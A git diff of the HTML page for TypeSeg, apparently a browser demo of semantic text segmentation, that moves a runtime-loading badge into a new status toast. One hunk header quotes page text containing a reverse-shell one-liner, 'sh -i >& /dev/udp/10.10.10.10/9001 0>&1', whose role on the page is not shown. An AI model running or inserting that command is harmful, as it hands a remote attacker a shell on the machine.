@@ -16,7 +16,6 @@
       <span class="brand-type">Type</span><span class="brand-seg">Seg</span>: Semantic Text Segmentation
     </div>
     <div class="topbar-actions">
-      <div id="runtimeBadge" class="badge neutral">Loading browser runtime...</div>
       <a href="https://pypi.org/project/typeseg/" target="_blank" rel="noopener" class="badge link-badge">🐍 pip install typeseg</a>
       <a href="https://github.com/S0urC10ud/semantic-text-segmentation" target="_blank" rel="noopener" class="badge link-badge">★ GitHub</a>
       <button id="settingsBtn" class="badge" style="cursor:pointer;">⚙️ Settings</button>
@@ -131,6 +130,15 @@ sh -i >& /dev/udp/10.10.10.10/9001 0>&1
   <footer class="footer">
     Client-side demo only. No text leaves your browser.
   </footer>
+
+  <div id="runtimeToast" class="runtime-toast" data-state="loading" role="status" aria-live="polite" aria-hidden="true">
+    <span class="runtime-toast-icon" aria-hidden="true">
+      <span class="rt-spinner"></span>
+      <svg class="rt-check" viewBox="0 0 24 24" width="16" height="16" fill="none"><path d="M5 12.5l4 4L19 7"/></svg>
+      <svg class="rt-cross" viewBox="0 0 24 24" width="16" height="16" fill="none"><path d="M6.5 6.5l11 11M17.5 6.5l-11 11"/></svg>
+    </span>
+    <span class="runtime-toast-text">Loading browser runtime&hellip;</span>
+  </div>
 
   <dialog id="settingsModal" class="modal" style="border:1px solid var(--border); border-radius:var(--radius); padding:0; max-width:400px; box-shadow:var(--shadow);">
     <div class="modal-content" style="padding:1.5rem;">
